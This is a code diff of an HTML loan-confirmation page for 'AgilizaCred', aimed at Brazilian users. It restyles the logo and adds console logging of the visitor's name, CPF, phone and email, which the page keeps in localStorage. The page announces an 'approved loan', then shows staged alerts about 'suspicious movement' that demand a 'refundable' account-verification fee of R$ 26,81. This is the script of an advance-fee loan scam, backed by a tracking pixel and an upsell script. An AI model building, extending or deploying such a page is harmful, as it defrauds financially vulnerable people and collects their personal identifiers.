@@ -5,18 +5,17 @@
 
     <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
     <script>
-      window.pixelId = "69853718bc934f7cb27cf6c5";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-    </script>
-
+  window.pixelId = "69853718bc934f7cb27cf6c5";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
     <title>AgilizaCred — Confirmação de Empréstimo</title>
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&family=Sora:wght@700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap');
 
         :root {
             --cred-primary: #22C55E;
@@ -43,7 +42,9 @@
             padding: 1rem;
         }
 
-        .card, .loading, .card-final {
+        .card,
+        .loading,
+        .card-final {
             padding: 1.5rem;
             max-width: 420px;
             width: 100%;
@@ -56,74 +57,48 @@
             box-shadow: 0 4px 20px rgba(34, 197, 94, 0.08);
         }
 
-        .card.active, .loading.active, .card-final.active { display: flex; }
+        .card.active,
+        .loading.active,
+        .card-final.active {
+            display: flex;
+        }
 
-        /* ===== LOGO (IGUAL AS OUTRAS PÁGINAS) ===== */
+        /* ===== LOGO POR IMAGEM (HEADER E RODAPÉ) ===== */
         .logo-container {
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 1rem;
         }
-        .logo-wrap{
+
+        .brand-logo{
             display:flex;
-            flex-direction:column;
             align-items:center;
+            justify-content:center;
             user-select:none;
             text-decoration:none;
-        }
-        .logo-row{
-            display:flex;
-            align-items:center;
-            gap:0;
-        }
-        .logo-cred{
-            font-family:'Sora','Plus Jakarta Sans',sans-serif;
-            font-weight:800;
-            font-size:20px;
-            color:#111827;
-            letter-spacing:-0.5px;
-            line-height:1;
-        }
-        .logo-diamond{
-            width:7px;
-            height:7px;
-            background: var(--cred-primary);
-            transform: rotate(45deg);
-            margin: 0 8px;
-            border-radius: 1.5px;
-            flex-shrink: 0;
-        }
-        .logo-on{
-            font-family:'Sora','Plus Jakarta Sans',sans-serif;
-            font-weight:800;
-            font-size:20px;
-            color: var(--cred-primary);
-            letter-spacing:-0.5px;
-            line-height:1;
-        }
-        .logo-tagline{
-            font-family:'DM Sans','Plus Jakarta Sans',sans-serif;
-            font-weight:600;
-            font-size:7px;
-            letter-spacing:2.5px;
-            text-transform:uppercase;
-            color:#6B7280;
-            margin-top:2px;
+            line-height:0;
         }
 
-        /* Footer logo (menor e mais “cinza”, igual padrão) */
-        .footer .logo-cred{ font-size:15px; color:#6B7280; }
-        .footer .logo-diamond{ width:5px; height:5px; margin:0 6px; background:#6B7280; border-radius:1px; }
-        .footer .logo-on{ font-size:15px; color: var(--cred-primary); }
-        .footer-tagline{
-            font-family:'DM Sans','Plus Jakarta Sans',sans-serif;
-            font-weight:600;
-            font-size:6px;
-            letter-spacing:2px;
-            text-transform:uppercase;
-            color:#9CA3AF;
-            margin-top:2px;
+        /* Troque o arquivo aqui (ex: /images/logo.png ou /images/logo.svg) */
+        .brand-logo img{
+            width: 170px;      /* ajuste se quiser */
+            height: auto;
+            display:block;
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 2rem;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .footer .brand-logo img{
+            width: 140px;      /* menor no rodapé */
+            height:auto;
+            display:block;
+            margin:0 auto .5rem;
         }
 
         h2 {
@@ -158,8 +133,13 @@
             padding: 0.5rem 0;
             border-bottom: 1px solid #f3f4f6;
         }
+
         .info-line:last-of-type { border-bottom: none; }
-        .info-line span:last-child { font-weight: 600; color: #111827; }
+
+        .info-line span:last-child {
+            font-weight: 600;
+            color: #111827;
+        }
 
         .box {
             margin-top: 1rem;
@@ -182,7 +162,8 @@
             color: var(--cred-primary);
         }
 
-        .button, .final-button {
+        .button,
+        .final-button {
             display: block;
             margin-top: 1rem;
             width: 100%;
@@ -198,8 +179,15 @@
             transition: transform .06s ease, filter .2s ease, box-shadow .2s ease;
             box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
         }
-        .button:active, .final-button:active { transform: scale(0.98); }
-        .button:hover, .final-button:hover { filter: brightness(1.05); box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4); }
+
+        .button:active,
+        .final-button:active { transform: scale(0.98); }
+
+        .button:hover,
+        .final-button:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
+        }
 
         .progress-bar {
             width: 100%;
@@ -281,8 +269,10 @@
             50% { box-shadow: 0 4px 25px rgba(34, 197, 94, 0.6); }
             100% { box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3); }
         }
+
         .pulse-green { animation: pulse-green 2s infinite; }
 
+        /* Badge de segurança */
         .security-badge {
             display: flex;
             align-items: center;
@@ -295,12 +285,11 @@
             font-size: 0.85rem;
             color: #6b7280;
         }
-        .security-badge svg { width: 16px; height: 16px; color: var(--cred-primary); }
 
-        .footer {
-            margin-top: 2rem;
-            text-align: center;
-            padding: 1rem;
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            color: var(--cred-primary);
         }
 
         .footer small {
@@ -309,8 +298,15 @@
             line-height: 1.4;
         }
 
+        /* Loading container styling */
         .loading { text-align: center; padding: 3rem 1.5rem; }
-        .loading .spinner { width: 48px; height: 48px; border-width: 4px; margin-bottom: 1.5rem; }
+
+        .loading .spinner {
+            width: 48px;
+            height: 48px;
+            border-width: 4px;
+            margin-bottom: 1.5rem;
+        }
     </style>
 </head>
 
@@ -318,14 +314,10 @@
     <!-- CARD INICIAL -->
     <div class="card active" id="card">
         <div class="logo-container">
-            <div class="logo-wrap">
-                <div class="logo-row">
-                    <span class="logo-cred">Agiliza</span>
-                    <span class="logo-diamond"></span>
-                    <span class="logo-on">Cred</span>
-                </div>
-                <span class="logo-tagline">Crédito Fácil</span>
-            </div>
+            <!-- ✅ LOGO POR IMAGEM -->
+            <a class="brand-logo" href="#" aria-label="AgilizaCred">
+                <img src="/images/logo.png" alt="AgilizaCred">
+            </a>
         </div>
         
         <h2><svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo Aprovado</h2>
@@ -371,14 +363,10 @@
     <!-- CARD FINAL -->
     <div class="card-final" id="card-final">
         <div class="logo-container">
-            <div class="logo-wrap">
-                <div class="logo-row">
-                    <span class="logo-cred">Agiliza</span>
-                    <span class="logo-diamond"></span>
-                    <span class="logo-on">Cred</span>
-                </div>
-                <span class="logo-tagline">Crédito Fácil</span>
-            </div>
+            <!-- ✅ LOGO POR IMAGEM -->
+            <a class="brand-logo" href="#" aria-label="AgilizaCred">
+                <img src="/images/logo.png" alt="AgilizaCred">
+            </a>
         </div>
         
         <h2 style="font-size: 1.25rem; margin-bottom: .5rem;"><svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>Comprovante de solicitação</h2>
@@ -395,14 +383,10 @@
 
     <!-- Footer -->
     <div class="footer">
-        <div class="logo-wrap">
-            <div class="logo-row">
-                <span class="logo-cred">Agiliza</span>
-                <span class="logo-diamond"></span>
-                <span class="logo-on">Cred</span>
-            </div>
-            <span class="footer-tagline">Crédito Fácil</span>
-        </div>
+        <!-- ✅ LOGO POR IMAGEM NO RODAPÉ -->
+        <a class="brand-logo" href="#" aria-label="AgilizaCred">
+            <img src="/images/logo.png" alt="AgilizaCred">
+        </a>
 
         <br>
         <small><strong>AgilizaCred Soluções Financeiras Ltda.</strong><br>CNPJ: 36.947.229/0001-85 – São Paulo, SP – 01310-200</small>
@@ -497,6 +481,12 @@
             if (telefone) LS.write("telephone", telefone);
             if (email) LS.write("email", email);
             if (credito) LS.write("creditoSolicitado", creditoNumber || credito);
+
+            console.info("[AGILIZACRED] hydrate()", {
+                origin: location.origin,
+                length: (() => { try { return localStorage.length } catch { return "blocked"; } })(),
+                nome, cpf, telefone, email, credito: creditoNumber, utmParams
+            });
         }
 
         window.iniciarTransferencia = function () {
@@ -505,7 +495,6 @@
             const bar = document.getElementById("bar");
             const statusText = document.getElementById("status-text");
             let progress = 0, trocado = false;
-
             const it = setInterval(() => {
                 if (progress >= 100) {
                     clearInterval(it);
@@ -534,72 +523,72 @@
         };
 
         document.addEventListener("DOMContentLoaded", hydrate);
-        window.addEventListener("load", () => { try { hydrate(); } catch (e) {} });
+        window.addEventListener("load", () => { try { hydrate(); } catch (e) { console.warn("hydrate@load", e); } });
     </script>
     
     <script>
-      function escapeHTML(str) {
-        return String(str)
-          .replace(/&/g, "&amp;")
-          .replace(/</g, "&lt;")
-          .replace(/>/g, "&gt;")
-          .replace(/"/g, "&quot;")
-          .replace(/'/g, "&#39;");
-      }
+  function escapeHTML(str) {
+    return String(str)
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
+  }
 
-      function nl2brSafe(str) {
-        return escapeHTML(str).replace(/\n/g, "<br>");
-      }
+  function nl2brSafe(str) {
+    return escapeHTML(str).replace(/\n/g, "<br>");
+  }
 
-      function exibirAlertasComSpinner() {
-        const wrapper = document.querySelector(".wrapper-final");
-        if (!wrapper) return;
-        wrapper.innerHTML = "";
+  function exibirAlertasComSpinner() {
+    const wrapper = document.querySelector(".wrapper-final");
+    if (!wrapper) return;
+    wrapper.innerHTML = "";
 
-        const alerts = [
-          { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Identificamos uma movimentação de valor alto suspeita!" },
-          { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes." },
-          { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", strong: true }
-        ];
+    const alerts = [
+      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Identificamos uma movimentação de valor alto suspeita!" },
+      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Por motivos de segurança é preciso realizar o pagamento da Taxa de Verificação de Conta para garantir a transferência segura e evitar possíveis fraudes." },
+      { icon: "https://i.postimg.cc/7ZXmSY20/logofalha.png", text: "Finalize o pagamento da Taxa de Verificação de Conta no valor de R$ 26,81 e confirme seu empréstimo. Essa taxa é reembolsável e será devolvida automaticamente após a confirmação do pagamento.", strong: true }
+    ];
 
-        let index = 0;
+    let index = 0;
 
-        function showNext() {
-          if (index >= alerts.length) return;
+    function showNext() {
+      if (index >= alerts.length) return;
 
-          const spinner = document.createElement("div");
-          spinner.className = "spinner";
-          wrapper.appendChild(spinner);
+      const spinner = document.createElement("div");
+      spinner.className = "spinner";
+      wrapper.appendChild(spinner);
 
-          setTimeout(() => {
-            spinner.remove();
+      setTimeout(() => {
+        spinner.remove();
 
-            const a = alerts[index];
-            const box = document.createElement("div");
-            box.className = "alert-box" + (a.strong ? " strong" : "");
+        const a = alerts[index];
+        const box = document.createElement("div");
+        box.className = "alert-box" + (a.strong ? " strong" : "");
 
-            const icon = document.createElement("img");
-            icon.className = "icon-img";
-            icon.alt = "Info";
-            icon.src = a.icon;
+        const icon = document.createElement("img");
+        icon.className = "icon-img";
+        icon.alt = "Info";
+        icon.src = a.icon;
 
-            const txt = document.createElement("div");
-            txt.innerHTML = nl2brSafe(a.text);
+        const txt = document.createElement("div");
+        txt.innerHTML = nl2brSafe(a.text);
 
-            box.appendChild(icon);
-            box.appendChild(txt);
+        box.appendChild(icon);
+        box.appendChild(txt);
 
-            box.style.display = "flex";
-            wrapper.appendChild(box);
+        box.style.display = "flex";
+        wrapper.appendChild(box);
 
-            index++;
-            setTimeout(showNext, 900);
-          }, 700);
-        }
+        index++;
+        setTimeout(showNext, 900);
+      }, 700);
+    }
 
-        showNext();
-      }
-    </script>
+    showNext();
+  }
+</script>
 
     <script src="js/upsells.js"></script>
     <script>
